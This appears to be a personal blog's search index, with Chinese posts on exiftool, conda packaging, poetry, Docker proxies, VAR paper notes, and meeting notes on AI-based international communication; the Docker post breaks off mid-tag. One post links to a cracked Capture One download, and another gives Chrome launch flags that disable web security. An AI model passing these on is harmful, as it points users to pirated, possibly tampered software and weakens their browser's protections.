<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/XT20%E4%BD%BF%E7%94%A8%E6%96%B0%E6%9C%BA%E5%9E%8B%E7%9A%84%E9%A2%84%E8%AE%BE.htm"/>
      <url>/XT20%E4%BD%BF%E7%94%A8%E6%96%B0%E6%9C%BA%E5%9E%8B%E7%9A%84%E9%A2%84%E8%AE%BE.htm</url>
      
        <content type="html"><![CDATA[<h2 id="1-下载exiftool"><a href="#1-下载exiftool" class="headerlink" title="1.下载exiftool"></a>1.下载exiftool</h2><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">https:</span>//exiftool<span class="meta">.org</span>/</span><br></pre></td></tr></table></figure><h2 id="2-利用exiftool命令行将文件夹下的RAF更改成其他型号"><a href="#2-利用exiftool命令行将文件夹下的RAF更改成其他型号" class="headerlink" title="2.利用exiftool命令行将文件夹下的RAF更改成其他型号"></a>2.利用exiftool命令行将文件夹下的RAF更改成其他型号</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exiftool -Model=<span class="string">&quot;X-T4&quot;</span> *.RAF</span><br></pre></td></tr></table></figure><h2 id="3-下载Capture-One"><a href="#3-下载Capture-One" class="headerlink" title="3.下载Capture One"></a>3.下载Capture One</h2><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//macked.app/capture-one-crack.html</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/%E7%BB%84%E4%BC%9A/%E6%9C%AA%E5%91%BD%E5%90%8D.htm"/>
      <url>/%E7%BB%84%E4%BC%9A/%E6%9C%AA%E5%91%BD%E5%90%8D.htm</url>
      
        <content type="html"><![CDATA[<p>知识多模态冲突<br>minibatch</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>精传系统页面权限配置</title>
      <link href="/%E7%B2%BE%E5%87%86%E5%9B%BD%E9%99%85%E4%BC%A0%E6%92%AD%E7%B3%BB%E7%BB%9F/%E7%B2%BE%E4%BC%A0%E7%B3%BB%E7%BB%9F%E9%A1%B5%E9%9D%A2%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE.htm"/>
      <url>/%E7%B2%BE%E5%87%86%E5%9B%BD%E9%99%85%E4%BC%A0%E6%92%AD%E7%B3%BB%E7%BB%9F/%E7%B2%BE%E4%BC%A0%E7%B3%BB%E7%BB%9F%E9%A1%B5%E9%9D%A2%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE.htm</url>
      
        <content type="html"><![CDATA[<ul><li><h3 id="允许Http页面WS连接"><a href="#允许Http页面WS连接" class="headerlink" title="允许Http页面WS连接"></a>允许Http页面WS连接</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">chrome:<span class="regexp">//</span>flags/<span class="comment">#unsafely-treat-insecure-origin-as-secure</span></span><br><span class="line">http:<span class="regexp">//</span><span class="number">172.27</span>.<span class="number">48.26</span>:<span class="number">8000</span>,http:<span class="regexp">//</span><span class="number">172.25</span>.<span class="number">156.61</span>:<span class="number">8000</span></span><br></pre></td></tr></table></figure></li><li><h3 id="允许摄像头和麦克风默认权限"><a href="#允许摄像头和麦克风默认权限" class="headerlink" title="允许摄像头和麦克风默认权限"></a>允许摄像头和麦克风默认权限</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">原来启动浏览器的地址：C:\Users\xxxxx\AppData\Local\Google\Chrome\Application\chrome<span class="selector-class">.exe</span></span><br><span class="line"> <span class="attr">--args</span> <span class="attr">--disable-web-security</span> <span class="attr">--user-data-dir</span>=<span class="string">&quot;d:/chromecache&quot;</span> <span class="attr">--allow-running-insecure-content</span> <span class="attr">--autoplay-policy</span>=no-user-gesture-required</span><br></pre></td></tr></table></figure></li><li><h3 id="允许自动播放权限"><a href="#允许自动播放权限" class="headerlink" title="允许自动播放权限"></a>允许自动播放权限</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">chrome:<span class="regexp">//</span>flags/<span class="comment">#autoplay-policy</span></span><br><span class="line">http:<span class="regexp">//</span><span class="number">172.27</span>.<span class="number">48.26</span>:<span class="number">8000</span>,http:<span class="regexp">//</span><span class="number">172.25</span>.<span class="number">156.61</span>:<span class="number">8000</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 精准国际传播 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>岳麓山数智传播 1</title>
      <link href="/%E5%B2%B3%E9%BA%93%E5%B1%B1%E6%95%B0%E6%99%BA%E4%BC%A0%E6%92%AD%E5%AE%9E%E9%AA%8C%E5%AE%A4/%E5%B2%B3%E9%BA%93%E5%B1%B1%E6%95%B0%E6%99%BA%E4%BC%A0%E6%92%AD%201.htm"/>
      <url>/%E5%B2%B3%E9%BA%93%E5%B1%B1%E6%95%B0%E6%99%BA%E4%BC%A0%E6%92%AD%E5%AE%9E%E9%AA%8C%E5%AE%A4/%E5%B2%B3%E9%BA%93%E5%B1%B1%E6%95%B0%E6%99%BA%E4%BC%A0%E6%92%AD%201.htm</url>
      
        <content type="html"><![CDATA[<p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102333565.png" alt="Pasted image 20241215153804"><br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102333606.png" alt="Pasted image 20241215153835"></p><p>智库是知识创新、政策研究和国际交流的重要平台，能够为大学提供智能辅助教学和智能课程设计等服务，从而推动大学教育的发展和国际影响力的提升。通过运用人工智能、大数据等技术，智库可以分析学生的学习情况，为教师提供个性化的教学建议，帮助学生更好地理解和掌握知识。例如，智库可以开发智能辅助教学系统，通过分析学生的答题情况，为教师提供针对性的教学方案，提高教学效果。智库拥有丰富的学术资源和研究经验，可以结合大学的学科特点和国际发展趋势，为大学设计符合时代需求的课程体系。此外，智库还可以为大学提供国际交流和合作的平台。智库与国际学术界和实务界保持着密切的联系，可以为大学引进国际优质教育资源，推动大学的国际化进程。例如，智库可以组织国际学术会议、研讨会等活动，邀请国内外专家学者共同探讨前沿问题和解决方案，提升大学的国际影响力。</p><h2 id="算法风险控制机制"><a href="#算法风险控制机制" class="headerlink" title="算法风险控制机制"></a>算法风险控制机制</h2><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102333629.png" alt="Pasted image 20241215154447"><br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102333651.png" alt="Pasted image 20241215160123"></p><h2 id="精准国际传播内容生成"><a href="#精准国际传播内容生成" class="headerlink" title="精准国际传播内容生成"></a>精准国际传播内容生成</h2><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102333674.png" alt="Pasted image 20241215160207"></p><h2 id="国际传播的个性化内容推荐"><a href="#国际传播的个性化内容推荐" class="headerlink" title="国际传播的个性化内容推荐"></a>国际传播的个性化内容推荐</h2><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102333704.png" alt="Pasted image 20241215160541"><br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102333744.png" alt="Pasted image 20241215160605"></p><h2 id="精准国际传播的智能化内容治理"><a href="#精准国际传播的智能化内容治理" class="headerlink" title="精准国际传播的智能化内容治理"></a>精准国际传播的智能化内容治理</h2><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102333764.png" alt="Pasted image 20241215160713"></p><h2 id="精准国际传播受众研究的新路径"><a href="#精准国际传播受众研究的新路径" class="headerlink" title="精准国际传播受众研究的新路径"></a>精准国际传播受众研究的新路径</h2><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102333791.png" alt="Pasted image 20241215161303"><br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102333813.png" alt="Pasted image 20241215161401"></p><h2 id="生成式国际受众精准画像"><a href="#生成式国际受众精准画像" class="headerlink" title="生成式国际受众精准画像"></a>生成式国际受众精准画像</h2><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102333835.png" alt="Pasted image 20241215162430"></p><h2 id="知识图谱"><a href="#知识图谱" class="headerlink" title="知识图谱"></a>知识图谱</h2><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102333864.png" alt="Pasted image 20241215162520"></p><h2 id="基于人工智能的精准翻译与话语表达"><a href="#基于人工智能的精准翻译与话语表达" class="headerlink" title="基于人工智能的精准翻译与话语表达"></a>基于人工智能的精准翻译与话语表达</h2><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102333888.png" alt="Pasted image 20241215162617"></p><h2 id="多模态翻译策略数据库构建"><a href="#多模态翻译策略数据库构建" class="headerlink" title="多模态翻译策略数据库构建"></a>多模态翻译策略数据库构建</h2><p>从各种专业领域的文献、网站、论坛等收集不同语境(例如外交、政治、经济、文化、军事等)下的专业翻译数据，这些多模态数据包括原文和译文对、术语表、经典影视视频，新闻视频等。在数据采集的过程中，还需要确保数据的质量和可用性。这意味着需要对收集到的数据进行清洗和预处理，去除无效或不相关的信息，保留高质量的数据用于后续的分析和研究。同时，构建多模态数据库是一个持续的过程，需要不断地更新和扩充，以适应语言和文化的发展变化。通过定期收集新的数据，并对现有数据进行维护和优化，可以确保数据库始终保持活力和相关性。</p><h2 id="精准多角度翻译策略的评估与优化"><a href="#精准多角度翻译策略的评估与优化" class="headerlink" title="精准多角度翻译策略的评估与优化"></a>精准多角度翻译策略的评估与优化</h2><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102333924.png" alt="Pasted image 20241215162903">%%  %%</p><h2 id="精准话语表达方式的分析与评估"><a href="#精准话语表达方式的分析与评估" class="headerlink" title="精准话语表达方式的分析与评估"></a>精准话语表达方式的分析与评估</h2><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102333969.png" alt="Pasted image 20241215163148"></p><h2 id="整体系统框架参考"><a href="#整体系统框架参考" class="headerlink" title="整体系统框架参考"></a>整体系统框架参考</h2><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102334025.png" alt="Pasted image 20241215163325"></p><h2 id="精准传播效果评估过程"><a href="#精准传播效果评估过程" class="headerlink" title="精准传播效果评估过程"></a>精准传播效果评估过程</h2><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102334035.png" alt="Pasted image 20241215163642"></p><p><strong>文化战略服务的定义：</strong><br>文化战略服务是以推动文化全球化传播为核心，综合运用多学科理论、跨领域资源和人工智能手段，为不同文化的交流与融合提供战略支持的一系列服务。其目的是以文化符号为载体，传播优秀文化内容，促进全球文化互鉴，提升文化影响力，并在国际舞台上实现文化价值与商业价值的双赢。</p><ol><li><strong>文化符号的识别与传播</strong>：以文化符号为核心，如古建艺术、神话传说、非物质文化遗产等，构建文化传播矩阵，结合创新性与适应性，提高符号的国际认知度与影响力。例如，中华文化符号在“国潮化”浪潮中焕发新生，如《黑神话：悟空》等十大数字文化IP，以游戏、动漫、影视等形式迅速扩展国际市场。</li><li><strong>跨界联动与主体多元化</strong>：通过跨界合作与品牌联名，实现文化产品的全球化推广，打造文化传播的生态圈。报告提出，微短剧等新赛道为文化传播提供了新路径，形成多元主体共同参与的传播体系。</li><li><strong>数字技术赋能</strong>：利用虚拟现实、增强现实等技术，拓展文化交流的形式与场景，实现线上线下结合，突破地理限制，让文化传播更加广泛和深度。</li><li><strong>地方文化传播与区域热点打造</strong>：以地方特色文化为切入点，塑造国际传播热点。例如，2024年具有国际影响力的文化传播热点如“China Travel”的上海、美食文化的甘肃天水以及中轴线申遗成功的北京等，为地方文化走向国际提供范例。</li><li><strong>文化传播的精准化与本土化结合</strong>：通过对不同文化背景的受众研究，结合国际化视野与本土化表达方式，确保文化传播能够被准确理解和接受，推动文化的深度对话与互动。<br>文化战略服务的任务定位：<br> 湖南师范大学作为文化战略服务的重要实践者，展示了对文化传播战略的深刻理解，特别是通过符号矩阵和传播指数，科学评估和优化了中华文化的全球传播策略。这种基于数据驱动和前瞻分析的方式，为文化战略服务提供了坚实的智力支持。<br> 同时，未来在推进网络文化交流、主办国际文化论坛和组织全球文化活动发挥桥梁作用。通过构建“文化+科技”的传播模式以及推动跨界联动与多元主体合作，为实现中华文化的全球化传播树立了新的标杆，为国际社会提供了文化交流与合作的“中国方案”。</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>岳麓山数智传播</title>
      <link href="/%E5%B2%B3%E9%BA%93%E5%B1%B1%E6%95%B0%E6%99%BA%E4%BC%A0%E6%92%AD%E5%AE%9E%E9%AA%8C%E5%AE%A4/%E5%B2%B3%E9%BA%93%E5%B1%B1%E6%95%B0%E6%99%BA%E4%BC%A0%E6%92%AD.htm"/>
      <url>/%E5%B2%B3%E9%BA%93%E5%B1%B1%E6%95%B0%E6%99%BA%E4%BC%A0%E6%92%AD%E5%AE%9E%E9%AA%8C%E5%AE%A4/%E5%B2%B3%E9%BA%93%E5%B1%B1%E6%95%B0%E6%99%BA%E4%BC%A0%E6%92%AD.htm</url>
      
        <content type="html"><![CDATA[<p>效能评估，预测、建议<br>1、文化传播效果分析——国际传播效能测评体系设计，<br>![[Pasted image 20241212153744.png]]</p><p>数据库：</p><ol><li><strong>多维度评价数据库</strong><ul><li><strong>文化内容分类</strong>：系统化收集和整理文化内容，涵盖主流意识形态、社会价值观、历史文化故事。</li><li><strong>传播媒介内容</strong>：包括所有形式的传播素材，如文字、图片、视频等，确保内容的多样性。</li><li><strong>权重配置与技术指标库</strong>：制定各指标的权重，监测内容传输速度、受众互动频率。</li><li><strong>受众与行为数据</strong>：涵盖人口统计、用户点击、观看和分享行为，以及情感反馈分析。</li></ul></li><li><strong>受众行为分析数据库</strong><ul><li><strong>用户画像</strong>：通过分析兴趣标签和语言习惯，构建详尽的受众文化背景。</li><li><strong>传播路径和数据时效性</strong>：追踪受众接触信息的渠道和行为链路，并对比不同时间点的数据。</li></ul></li><li><strong>数据监测与反馈数据库</strong><ul><li><strong>舆情和效果评估数据</strong>：实时抓取社交媒体、新闻网站数据，评估传播效果的广度与深度。</li></ul></li><li><strong>语言文化数据库</strong><ul><li><strong>语汇资源与语义网络数据库</strong>：储备多语言词汇表，并分析新概念间的语义关联性。</li></ul></li><li><strong>文化背景知识库</strong><ul><li><strong>文化语境和历史关联性</strong>：整合目标受众的文化背景、习俗，与传统文化故事的结合点。</li></ul></li><li><strong>传播路径优化数据库</strong><ul><li><strong>渠道数据与内容定制规则库</strong>：通过算法支持优化传播路径和内容推荐。</li></ul></li><li><strong>情感与认知反馈数据库</strong><ul><li><strong>情绪与认知评估</strong>：分析受众对新概念的情感反馈，评估概念接受度与传播难点。<br>模型层面：</li></ul><ol><li><strong>传播效能理论评估模型</strong>：通过权重分配和评价准则，量化主流意识形态的传播力。</li><li><strong>文化传播行为模型</strong>：国际传播的影响因子（如价值观冲突、信息流通等），时政背景下的传播适应性模型。</li><li><strong>传播效果分析模型</strong>：实现文化传播深度与广度的定量与定性分析。<br>算法层面：</li><li>多维数据加权平均计算（基于图片中的权重）</li><li>AHP（层次分析法）模型，用于确定指标重要性。</li><li>信息流通的最优路径分析：跨文化语境考虑，动态调整信息传播路径，考虑不同地区的文化语境和接受度，并结合外部环境变化，动态调整传播策略。</li><li>社交网络传播模拟算法。</li><li>模拟受众反馈的机器学习算法（如情感分析、关键字提取）。</li><li>国际化语言文化差异的自然语言处理算法。</li><li>根据时间和环境变化实时调整传播策略的动态算法。</li><li><strong>虚假信息识别算法</strong>：利用自然语言处理和机器学习算法，识别并过滤虚假和垃圾信息。利用Agent结合多源信源验证，加强对新闻真实性的识别。</li><li><strong>内容多样性算法</strong>：多视角推荐算法，避免信息茧房，通过多视角视图和交叉推荐，扩展信息视野。有利于模型的反偏见决策，防止内容个性化过程中的偏见强化。</li><li><strong>意识形态安全算法</strong>：分析内容的情感倾向和意识形态立场，预判潜在风险。在识别到敏感内容时，触发警示机制。<br>应用层面：</li><li><strong>媒体智优 (MediaSmart)</strong>：提供主流媒体内容的优化策略，提高信息质量和传播效果。</li><li><strong>文化桥梁 (CultureBridge)</strong>：针对国际受众文化适应的传播内容定制。</li><li><strong>流通监控器 (FlowMonitor)</strong>：信息流通动态监测（通过技术指标如主流媒体信息传播的丰富度，国家党政方针、重大决策传播的针对性和精准度）。</li><li><strong>断点分析仪 (BreakPointAnalyser)</strong>：传播中断点与信息滞留的分析。</li><li><strong>全景透视 (PanoramaReach)</strong>：评估传播覆盖范围与受众渗透率，优化推广策略。</li><li><strong>效能评估器 (EfficiencyEvaluator)</strong>：基于C10-C15的传播效果综合评价（多特征传播效果综合评价）。</li><li><strong>数据驱动者 (DataDriver)</strong>：利用数据优化传播效率，实现智能化传播管理。。</li><li><strong>湖湘视界</strong>：借助多模态视频生成模型类似sora，增强湖湘乃至中国文化传播的互动性与吸引力。</li><li><strong>事实核查平台</strong>：对内容真实度校验，结合事实核查资源，增强内容质量验证。通过用户反馈标记可疑内容，改进内容筛选。</li><li><strong>真相守卫者 (TruthGuard)</strong>：聚焦于涉华虚假信息的识别与反制，确保信息的真实性和公正性。</li><li><strong>叙事追踪器 (NarrativeTrack)</strong>：用于分析和评估国际传播中的叙事策略与效果，优化传播路径。</li><li><strong>舆情智控 (AI ViewControl)</strong>：研究与管理人工智能生成内容对舆论生态的影响，维护信息健康。</li><li><strong>镜鉴平台 (ReflectiveLens)</strong>：应对国际舆论战，提供虚假信息的快速检测与应对策略。<br>2、精准化传播新语汇、新概念、新路径——例如特朗普和习主席讲话，习主席谈到中国是龙的传人，但是龙在西方是邪恶的代表，要把这个新语汇传播出去。新路径就是</li></ol></li></ol><p>文化传播效果分析<br>1、人工智能生产内容对舆论生态的挑战、影响与治理研究<br>2、中国文化对外传播话语构建、叙事策略与效果评价研究<br>3、国际传播效能测评体系设计和机制建设研究<br>4、国际舆论战中涉华虚假信息传播及对策研究</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2024年12月12日新传会议</title>
      <link href="/%E6%96%B0%E4%BC%A0%E9%A1%B9%E7%9B%AE/2024%E5%B9%B412%E6%9C%8812%E6%97%A5%E9%99%88%E8%80%81%E5%B8%88%E4%BC%9A%E8%AE%AE.htm"/>
      <url>/%E6%96%B0%E4%BC%A0%E9%A1%B9%E7%9B%AE/2024%E5%B9%B412%E6%9C%8812%E6%97%A5%E9%99%88%E8%80%81%E5%B8%88%E4%BC%9A%E8%AE%AE.htm</url>
      
        <content type="html"><![CDATA[<ul><li>筛选</li><li>人工智能辅助的内容分析</li><li>以整个视频和场景区分这两个做个比较，细小的研究单元，codebook可以生成一些没有的标签。recommend practice，以多少比例为training，筛选一下VID</li><li>**场景区分（比较擅长，没有），分场景+总结-，人物，地点，环境，辅助生成标签，提出一个argument</li><li><strong>转场，codebook标签总结的，评论分析</strong></li><li>完成度</li><li>评估<br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20250102150143618.png" alt="image.png"></li></ul><p>评论区的lda主题和内容的主题，情感分析（类别太细类别大于3）</p><p>人工分析结果+机器评论分析结果<br>视频主题和评论主题<br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20250102150643185.png" alt="image.png"></p><p>先分类这几类，文字+表情包 vs 文字 vs 表情包（情感浓度）<br>评论区超过1000评论的视频<br>7,8号<br>单个视频评论区的各个主题与点赞数之间的关系（比率）<br><img src alt="Uploading file...03yoq"></p><p>筛选后去重后296个视频，分析了287个，有9个视频时长太长了，分析出错，待优化策略，5帧改成10帧</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>岳麓山文化数智传播实验室第三次会议</title>
      <link href="/%E5%B2%B3%E9%BA%93%E5%B1%B1%E6%95%B0%E6%99%BA%E4%BC%A0%E6%92%AD%E5%AE%9E%E9%AA%8C%E5%AE%A4/%E5%B2%B3%E9%BA%93%E5%B1%B1%E6%96%87%E5%8C%96%E6%95%B0%E6%99%BA%E4%BC%A0%E6%92%AD%E5%AE%9E%E9%AA%8C%E5%AE%A4%E7%AC%AC%E4%B8%89%E6%AC%A1%E4%BC%9A%E8%AE%AE.htm"/>
      <url>/%E5%B2%B3%E9%BA%93%E5%B1%B1%E6%95%B0%E6%99%BA%E4%BC%A0%E6%92%AD%E5%AE%9E%E9%AA%8C%E5%AE%A4/%E5%B2%B3%E9%BA%93%E5%B1%B1%E6%96%87%E5%8C%96%E6%95%B0%E6%99%BA%E4%BC%A0%E6%92%AD%E5%AE%9E%E9%AA%8C%E5%AE%A4%E7%AC%AC%E4%B8%89%E6%AC%A1%E4%BC%9A%E8%AE%AE.htm</url>
      
        <content type="html"><![CDATA[<h1 id="三个要求："><a href="#三个要求：" class="headerlink" title="三个要求："></a>三个要求：</h1><h2 id="一、实验室建立的重要目的"><a href="#一、实验室建立的重要目的" class="headerlink" title="一、实验室建立的重要目的"></a>一、实验室建立的重要目的</h2><h3 id="建设目标："><a href="#建设目标：" class="headerlink" title="建设目标："></a>建设目标：</h3><h4 id="1-湖大层面"><a href="#1-湖大层面" class="headerlink" title="1.湖大层面"></a>1.湖大层面</h4><p>建设思想文化库、全球范围的思想文化动态监测站、服务国家和社会。</p><h4 id="2-中华传统文化大数据，如何建设好？传播出去？"><a href="#2-中华传统文化大数据，如何建设好？传播出去？" class="headerlink" title="2.中华传统文化大数据，如何建设好？传播出去？"></a>2.中华传统文化大数据，如何建设好？传播出去？</h4><h4 id="3-文化传播的效果评价（师大）"><a href="#3-文化传播的效果评价（师大）" class="headerlink" title="3.文化传播的效果评价（师大）"></a>3.文化传播的效果评价（师大）</h4><p>思想文化交流交融交锋中占据主导，师大重要是传播的效能上做一些事。</p><h4 id="4-实验室经费10亿。"><a href="#4-实验室经费10亿。" class="headerlink" title="4.实验室经费10亿。"></a>4.实验室经费10亿。</h4><h3 id="讨论："><a href="#讨论：" class="headerlink" title="讨论："></a>讨论：</h3><p>@比较有新意的是文化动态感知，不要太偏技术，让大众能感知大数据的动态效果（实时发布什么东西），舆情监测这种东西尽可能避开，避开之后就是新的阵地<br>@跟产业对应上，要提供高质量的文化服务，支撑整个湖南省的志愿服务<br>@湖大和师大要一起搞一块<br>@对外的文化库，生成什么，满足中宣部的要求。实验室机构的实体化比较关键<br>@L0依托超算平台<br>@L1对外传播文化库<br>@L2精准传播演算<br>@L3自主自动体系<br>@超算角度，可信、可控，数据算量可信，训练过程可控，文旅产业对大模型搞不懂…</p><h3 id="会议附图："><a href="#会议附图：" class="headerlink" title="会议附图："></a>会议附图：</h3><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216103017334.png" alt="IMG_1758"></p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216103017335.png" alt="IMG_1757"><br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216103017336.png" alt="IMG_1759"><br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216103017337.png" alt="IMG_1762 2"><br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216103017338.png" alt="IMG_1761"><br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216103017339.png" alt="IMG_1762"></p><h2 id="二、为什么放在湖南，有什么优势"><a href="#二、为什么放在湖南，有什么优势" class="headerlink" title="二、为什么放在湖南，有什么优势"></a>二、为什么放在湖南，有什么优势</h2><h2 id="三、服务两个目标，设计哪些重大的场景的设计，让人耳目一新"><a href="#三、服务两个目标，设计哪些重大的场景的设计，让人耳目一新" class="headerlink" title="三、服务两个目标，设计哪些重大的场景的设计，让人耳目一新"></a>三、服务两个目标，设计哪些重大的场景的设计，让人耳目一新</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>conda环境打包</title>
      <link href="/conda%E7%8E%AF%E5%A2%83%E6%89%93%E5%8C%85.htm"/>
      <url>/conda%E7%8E%AF%E5%A2%83%E6%89%93%E5%8C%85.htm</url>
      
        <content type="html"><![CDATA[<h2 id="打包环境"><a href="#打包环境" class="headerlink" title="打包环境"></a>打包环境</h2><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 随便找个环境装一下包</span></span><br><span class="line">pip install conda-<span class="keyword">pack</span></span><br><span class="line"><span class="comment"># -n 打包环境名</span></span><br><span class="line">conda-<span class="keyword">pack</span> -n vllm -o sglang.tar.gz</span><br></pre></td></tr></table></figure><h2 id="还原环境"><a href="#还原环境" class="headerlink" title="还原环境"></a>还原环境</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /opt/conda/envs/sglang</span><br><span class="line">tar -zxvf sglang.tar.gz -C /opt/conda/envs/sglang</span><br><span class="line">conda <span class="built_in">env</span> list</span><br><span class="line"><span class="built_in">source</span> activate sglang</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>VAR论文</title>
      <link href="/%E8%AE%BA%E6%96%87/VAR%E8%AE%BA%E6%96%87.htm"/>
      <url>/%E8%AE%BA%E6%96%87/VAR%E8%AE%BA%E6%96%87.htm</url>
      
        <content type="html"><![CDATA[<h1 id="Visual-Autoregressive-Modeling-Scalable-Image-Generation-via-Next-Scale-Prediction"><a href="#Visual-Autoregressive-Modeling-Scalable-Image-Generation-via-Next-Scale-Prediction" class="headerlink" title="Visual Autoregressive Modeling: Scalable Image Generation via Next-Scale Prediction"></a>Visual Autoregressive Modeling: Scalable Image Generation via Next-Scale Prediction</h1><p>本文提出的图像自回归（VAR）超越Diffusion，在大模型上的Scaling Laws和zero-shot generalization可以迁移过来<br>OpenAI 就曾推出一个图像版的 GPT 模型。具体来说，他们先将一张二维图片拉平成一个序列（sequence），使之可以像语言模型中的句子那样处理。因为图像中的颜色限制在 256 色范围内，因此可以将颜色当作 token，token 的数量就是 256 个。接下来，使用自回归模型（Auto-regressive Model），架构与 GPT 类似，进行训练。</p><p>生成图像时，这种模型会按顺序一排一排地生成像素，这个生成顺序被称为 ‘光栅顺序（Raster Order）’，有点像视频显示格式Progressive scanning的逐行扫描的样子。这种方法可以生成相对清晰的图像，但计算时间较长，因此在实际的图像生成任务中，多数模型会采用一次到位的生成方法，以提高生成效率。</p><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">改进点：</span><br><span class="line"><span class="keyword">Next</span> scale prediction</span><br><span class="line">而不是<span class="keyword">Next</span> token prediction</span><br></pre></td></tr></table></figure><p>Next token prediction缺点：<br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/20241216102751933.png" alt="Pasted image 20241207105924"></p><p>我们知道VAE可以把图片编码成符合标准正态分布的向量即可。让向量符合标准正态分布的原因是方便随机采样。同时，需要强调的是，VAE编码出来的向量是<strong>连续向量</strong>，也就是向量的每一维都是浮点数。如果把向量的某一维稍微改动0.0001，解码器还是认得这个向量，并且会生成一张和原向量对应图片差不多的图片。</p><p>但是，VAE生成出来的图片都不是很好看。VQ-VAE的作者认为，VAE的生成图片之所以质量不高，是因为图片被编码成了连续向量。而实际上，把图片编码成<strong>离散向量</strong>会更加自然。比如我们想让画家画一个人，我们会说这个是男是女，年龄是偏老还是偏年轻，体型是胖还是壮，而不会说这个人性别是0.5，年龄是0.6，体型是0.7。因此，VQ-VAE会把图片编码成离散向量，如下图所示。</p><p>神经网络会默认输入满足一个连续的分布，而不善于处理离散的输入。如果你直接输入0, 1, 2这些数字，神经网络会默认1是一个处于0, 2中间的一种状态。为了解决这一问题，我们可以借鉴NLP中对于离散单词的处理方法。为了处理离散的输入单词，NLP模型的第一层一般都是词嵌入层，它可以把每个输入单词都映射到一个独一无二的连续向量上。这样，每个离散的数字都变成了一个特别的连续向量了。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>poetry is pending的坑</title>
      <link href="/poetry%20is%20pending%E7%9A%84%E5%9D%91.htm"/>
      <url>/poetry%20is%20pending%E7%9A%84%E5%9D%91.htm</url>
      
        <content type="html"><![CDATA[<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> <span class="attribute">PYTHON_KEYRING_BACKEND</span>=keyring.backends.null.Keyring</span><br><span class="line">python3 -m keyring --<span class="built_in">disable</span></span><br><span class="line">poetry install -vvv</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Docker代理配置</title>
      <link href="/Docker%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE.htm"/>
      <url>/Docker%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE.htm</url>
      
        <content type="html"><![CDATA[<h3 id="1-为Docker-Daemon配置代理"><a href="#1-为Docker-Daemon配置代理" class="headerlink" title="1. 为Docker Daemon配置代理"></a>1. 为Docker Daemon配置代理</h3><h3 id="1-1-使用systemd配置代理"><a href="#1-1-使用systemd配置代理" class="headerlink" title="1.1 使用systemd配置代理"></a>1.1 使用<code>systemd</code>配置代理</h3><p>为了使<code>docker pull</code>指令使用代理，需要在<code>/lib/systemd/system/docker.service</code>中的<code>[Service]</code>片段下添加<code>HTTP_PROXY</code>和<code>HTTPS_PROXY</code>环境变量：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Service]</span><br><span class="line"><span class="comment"># 新增环境变量提供代理服务器信息</span></span><br><span class="line">Environment=<span 